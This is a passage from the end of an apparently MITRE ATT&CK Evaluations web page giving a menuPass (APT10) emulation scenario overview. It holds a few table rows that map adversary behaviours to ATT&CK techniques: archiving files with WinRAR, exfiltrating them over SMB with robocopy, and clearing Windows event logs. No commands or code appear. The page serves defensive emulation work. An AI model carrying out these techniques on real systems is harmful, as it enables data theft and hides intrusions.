<td><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-japan-espionage" class="outbound" target="_blank"><span>Symantec</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>WinRAR.exe compresses files of interest</td>
<td>-</td>
<td>T1560.001 Archive Collected Data: Archive via Utility</td>
<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-technical-annex-april-2017.pdf#page=27" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>robocopy exfiltrates compressed files to adversary SMB share</td>
<td>-</td>
<td>T1039 Data from Network Shared Drive</td>
<td><a href="https://www.pwc.co.uk/cyber-security/pdf/pwc-uk-operation-cloud-hopper-report-april-2017.pdf" class="outbound" target="_blank"><span>pwc</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
<tr>
<td>List and clear all Windows event logs</td>
<td>-</td>
<td>T1070.001 Indicator Removal: Clear Windows Event Logs</td>
<td><a href="https://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_202_niwa-yanagishita_en.pdf" class="outbound" target="_blank"><span>JSAC-jpcert</span><svg xmlns="http://www.w3.org/2000/svg" class="docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
</tr>
</tbody>
</table>
</div>
 </details>
<br>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../managedservices/menupass/emulation_plan/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">menu​Pass Emulation Plans</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../managedservices/menupass/resources/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">Resources</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                        <li>
                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200 md:mb-0" href="https://github.com/attackevals/ael">
                                                <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                    <g fill="currentColor">
                                                        <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
                                                    </g>
                                                </svg>
                                                <span>ATTACK Evaluations Library GitHub</span>
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2024. All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "menuPass Scenario Overview", level: 4, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
